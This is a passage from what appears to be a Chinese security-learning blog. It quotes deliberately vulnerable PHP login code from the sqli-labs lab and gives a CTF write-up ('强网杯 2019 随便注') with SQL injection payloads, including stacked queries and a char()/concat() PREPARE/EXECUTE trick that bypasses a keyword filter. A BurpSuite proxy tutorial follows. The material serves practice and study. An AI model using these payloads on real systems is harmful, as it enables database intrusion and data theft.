class=&#34;variable&#34;&gt;$sql&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;variable&#34;&gt;$row&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_fetch_array&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$result&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$row&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  		&lt;span class=&#34;comment&#34;&gt;//echo &amp;#x27;&amp;lt;font color= &amp;quot;#0000ff&amp;quot;&amp;gt;&amp;#x27;;	&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  		&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;font color= &amp;quot;#FFFF00&amp;quot; font size = 4&amp;gt;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;comment&#34;&gt;//echo &amp;quot; You Have successfully logged in &amp;quot; ;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;font size=&amp;quot;3&amp;quot; color=&amp;quot;#0000ff&amp;quot;&amp;gt;&amp;#x27;&lt;/span&gt;;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;comment&#34;&gt;//echo &amp;#x27;Your Login name:&amp;#x27;. $row[&amp;#x27;username&amp;#x27;];&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;comment&#34;&gt;//echo &amp;quot;&amp;lt;br&amp;gt;&amp;quot;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;comment&#34;&gt;//echo &amp;#x27;Your Password:&amp;#x27; .$row[&amp;#x27;password&amp;#x27;];&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;comment&#34;&gt;//echo &amp;quot;&amp;lt;br&amp;gt;&amp;quot;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/font&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;img src=&amp;quot;../images/flag.jpg&amp;quot;   /&amp;gt;&amp;#x27;&lt;/span&gt;;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/font&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;font color= &amp;quot;#0000ff&amp;quot; font size=&amp;quot;3&amp;quot;&amp;gt;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;comment&#34;&gt;//echo &amp;quot;Try again looser&amp;quot;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;title function_ invoke__&#34;&gt;print_r&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_error&lt;/span&gt;());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;img src=&amp;quot;../images/slap.jpg&amp;quot;   /&amp;gt;&amp;#x27;&lt;/span&gt;;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/font&amp;gt;&amp;quot;&lt;/span&gt;;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;span id=&#34;26-sqli-labs-masterless-14sqlmap-布尔没跑出来&#34;&gt; 26. sqli-labs-master/Less-14（sqlmap 布尔没跑出来！！！)&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;字符型报错、布尔、时间&lt;br&gt;
查看源代码，发现只能报错注入，是 &amp;quot;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;代码&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$uname&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;quot;&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$uname&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;quot;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;variable&#34;&gt;$passwd&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;quot;&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$passwd&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;quot;&amp;#x27;&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	@&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;SELECT username, password FROM users WHERE username=&lt;span class=&#34;subst&#34;&gt;$uname&lt;/span&gt; and password=&lt;span class=&#34;subst&#34;&gt;$passwd&lt;/span&gt; LIMIT 0,1&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;variable&#34;&gt;$result&lt;/span&gt;=&lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_query&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;variable&#34;&gt;$row&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_fetch_array&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$result&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$row&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  		&lt;span class=&#34;comment&#34;&gt;//echo &amp;#x27;&amp;lt;font color= &amp;quot;#0000ff&amp;quot;&amp;gt;&amp;#x27;;	&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  		&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;font color= &amp;quot;#FFFF00&amp;quot; font size = 4&amp;gt;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;comment&#34;&gt;//echo &amp;quot; You Have successfully logged in &amp;quot; ;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;font size=&amp;quot;3&amp;quot; color=&amp;quot;#0000ff&amp;quot;&amp;gt;&amp;#x27;&lt;/span&gt;;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;comment&#34;&gt;//echo &amp;#x27;Your Login name:&amp;#x27;. $row[&amp;#x27;username&amp;#x27;];&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;comment&#34;&gt;//echo &amp;quot;&amp;lt;br&amp;gt;&amp;quot;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;comment&#34;&gt;//echo &amp;#x27;Your Password:&amp;#x27; .$row[&amp;#x27;password&amp;#x27;];&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;comment&#34;&gt;//echo &amp;quot;&amp;lt;br&amp;gt;&amp;quot;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/font&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;img src=&amp;quot;../images/flag.jpg&amp;quot; /&amp;gt;&amp;#x27;&lt;/span&gt;;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/font&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;font color= &amp;quot;#0000ff&amp;quot; font size=&amp;quot;3&amp;quot;&amp;gt;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;comment&#34;&gt;//echo &amp;quot;Try again looser&amp;quot;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;title function_ invoke__&#34;&gt;print_r&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_error&lt;/span&gt;());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;img src=&amp;quot;../images/slap.jpg&amp;quot;  /&amp;gt;&amp;#x27;&lt;/span&gt;;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/font&amp;gt;&amp;quot;&lt;/span&gt;;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;span id=&#34;27-sqli-labs-masterless-15sqlmap-布尔没跑出来&#34;&gt; 27. sqli-labs-master/Less-15（sqlmap 布尔没跑出来！！！)&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;字符型布尔、时间&lt;br&gt;
’&lt;/p&gt;
&lt;h2&gt;&lt;span id=&#34;28-sqli-labs-masterless-16sqlmap-布尔-时间没跑出来&#34;&gt; 28. sqli-labs-master/Less-16（sqlmap 布尔、时间没跑出来！！！)&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;字符型布尔、时间&lt;br&gt;
 &amp;quot;)&lt;/p&gt;
&lt;h2&gt;&lt;span id=&#34;29-sqli-labs-masterless-17&#34;&gt; 29. sqli-labs-master/Less-17&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;字符型布尔、时间&lt;br&gt;
’&lt;/p&gt;
&lt;h2&gt;&lt;span id=&#34;27-强网杯-2019-随便注&#34;&gt; 27. [强网杯 2019] 随便注&lt;/span&gt;&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;判断类型&lt;br&gt;
 1 or 1 = 1 #&lt;br&gt;
1’ or 1 = 1 #&lt;br&gt;
字符型&lt;/li&gt;
&lt;li&gt;判断字段数&lt;br&gt;
 1’ order by 2 #&lt;br&gt;
1’ order by 3 #&lt;br&gt;
字段数为 3&lt;/li&gt;
&lt;li&gt;联合注入？&lt;br&gt;
0’ union select 1,2 #&lt;br&gt;
得到：return preg_match (&amp;quot;/select|update|delete|drop|insert|where|./i&amp;quot;,$inject);&lt;br&gt;
 说明对这些字符进行了过滤，所以联合注入貌似不得行&lt;/li&gt;
&lt;li&gt;堆叠注入&lt;br&gt;
爆库：0’;show databases;#&lt;br&gt;
爆表：0’;show tables;#&lt;br&gt;
爆列：0’;show columns from words;#&lt;br&gt;
0’;show columns from  &lt;code&gt;1919810931114514&lt;/code&gt; ;#&lt;br&gt;
为什么用反引号呢？因为当数字型字符作为字段、表、库名查询时，应该用反单引号括起来输入之后得到&lt;/li&gt;
&lt;li&gt;爆值&lt;br&gt;
 PREPARE sqla from ‘[my sql sequece]’;  	 预定义 SQL 语句&lt;br&gt;
 EXECUTE sqla; 							 执行预定义 SQL 语句&lt;br&gt;
 (DEALLOCATE || DROP) PREPARE sqla;  	 删除预定义 SQL 语句&lt;br&gt;
通过变量进行传递&lt;br&gt;
 SET @tn = ‘flag’;  					存储表名&lt;br&gt;
 PREPARE sqla from @sql;   		预定义 SQL 语句&lt;br&gt;
 EXECUTE sqla;  				执行预定义 SQL 语句&lt;br&gt;
 (DEALLOCATE || DROP) PREPARE sqla;  	删除预定义 SQL 语句&lt;br&gt;
 PREPARE 语句准备好一条 SQL 语句，并分配给这条 SQL 语句一个名字供之后调用。&lt;br&gt;
准备好的 SQL 语句通过 EXECUTE 命令执行，通过 DEALLOCATE PREPARE 命令释放掉。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;本题即可利用 char () 方法将 ASCII 码转换为 SELECT 字符串，接着利用 concat () 方法进行拼接获得查询的 SQL 语句，最后执行即可，payload 如下：&lt;/p&gt;
&lt;p&gt;1’;SET @sql=concat(char(115,101,108,101,99,116),&amp;quot; * from    &lt;code&gt;1919810931114514&lt;/code&gt; &amp;quot;);PREPARE sqla from @sql;EXECUTE sqla;&lt;/p&gt;

 &lt;h2&gt;&lt;span id=&#34;简介&#34;&gt; 简介&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;BurpSuite 是用于攻击 web 应用程序的集成平台，它包含了许多 Burp 工具，所有的工具都共享一个能处理并显示 HTTP 消息，持久性，认证，代理，日志，警报的一个强大的可扩展的框架。是一个为渗透测试人员开发的集成平台，利用 BurpSuite，可以更高效更快速的发现系统或者服务漏洞。&lt;/p&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;  
&lt;h2&gt;&lt;span id=&#34;模块&#34;&gt; 模块&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;BurpSuite 下会有很多功能实现模块&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Target (目标)—— 显示目标目录结构的的一个功能，也就是站点。&lt;/li&gt;
&lt;li&gt;Proxy (代理)—— 拦截 HTTP/S 的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。&lt;/li&gt;
&lt;li&gt;Spider (蜘蛛)—— 应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能。&lt;/li&gt;
&lt;li&gt;Scanner (扫描器)—— 高级工具，执行后，它能自动地发现 web 应用程序的安全漏洞。&lt;/li&gt;
&lt;li&gt;Intruder (入侵)—— 一个定制的高度可配置的工具，对 web 应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用 fuzzing 技术探测常规漏洞。&lt;/li&gt;
&lt;li&gt;Repeater (中继器)—— 一个靠手动操作来触发单独的 HTTP 请求，并分析应用程序响应的工具。&lt;/li&gt;
&lt;li&gt;Sequencer (会话)—— 用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具。&lt;/li&gt;
&lt;li&gt;Decoder (解码器)—— 进行手动执行或对应用程序数据者智能解码编码的工具。&lt;/li&gt;
&lt;li&gt;Comparer (对比)—— 通常是通过一些相关的请求和响应得到两项数据的一个可视化的 “差异”。&lt;/li&gt;
&lt;li&gt;Extender (扩展)—— 可以让你加载 BurpSuite 的扩展，使用你自己的或第三方代码来扩展 Burp Suit 的功能。&lt;/li&gt;
&lt;li&gt;User Options (设置)—— 对 BurpSuite 的一些设置&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;&lt;span id=&#34;burpsuite-proxy&#34;&gt; burpsuite proxy&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;进入 Proxy 模块，点击 Options 选项，勾选默认分配的代理地址和端口：127.0.0.1：8080&lt;br&gt;
proxy (代理)&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;burp 自带浏览器&lt;br&gt;
&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/47.png?raw=true&#34; alt&gt;&lt;/li&gt;
&lt;li&gt;抓包&lt;br&gt;
输入网址再启动按钮变成 on, 刷新即可抓取包内容&lt;br&gt;
&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/48.png?raw=true&#34; alt&gt;&lt;br&gt;
 forword: 继续发包，继续看后面的包内容&lt;br&gt;
 drop: 扔包&lt;br&gt;
 HTTP history：曾经抓取包的内容&lt;br&gt;
&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/48.png?raw=true&#34; alt&gt;&lt;br&gt;
 raw: 包内容&lt;br&gt;
 response: 发包后页面响应的内容。其中 pretty 格式化代码内容，raw：源码，render：渲染后可视化界面样式&lt;br&gt;
&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/49.png?raw=true&#34; alt&gt;&lt;br&gt;
 filter: 筛选脚本类型和图片&lt;br&gt;
&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/50.png?raw=true&#34; alt&gt;&lt;br&gt;
&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/72.png?raw=true&#34; alt&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;raw：包含各种请求信息，可以进行手工修改，对服务端进行渗透测试。&lt;/li&gt;
&lt;li&gt;params：get 和 post 请求参数的内容&lt;/li&gt;
&lt;li&gt;headers：直观展示 raw 里面的大致内容&lt;/li&gt;
&lt;li&gt;hex：raw 的十六进制内容&lt;/li&gt;
&lt;li&gt;action：除了将当前请求的消息传递到 Spider、Scanner、Repeater、Intruder、Sequencer、Decoder、Comparer 组件外，还可以做一些请求消息的修改，如改变 GET 或者 POST 请求方式、改变请求 body 的编码，同时也可以改变请求消息的拦截设置，如不再拦截此主机的消息、不再拦截此 IP 地址的消息、不再拦截此种文件类型的消息、不再拦截此目录的消息，也可以指定针对此消息拦截它的服务器端返回消息。&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;options&lt;br&gt;
 一般是对请求包和发送包内容进行正则匹配，或者改写和过滤，功能比较细。具体情况，具体分析。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;&lt;span id=&#34;burpsuite-target&#34;&gt; burpsuite target&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;目标查看器&lt;br&gt;
 site map: 曾经访问过网址的一些具体包内容，细节操作和之前也是一样的&lt;br&gt;
&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/51.png?raw=true&#34; alt&gt;&lt;/p&gt;
&lt;h2&gt;&lt;span id=&#34;burpsuite-repeater&#34;&gt; burpsuite repeater&lt;/span&gt;&lt;/h2&gt;
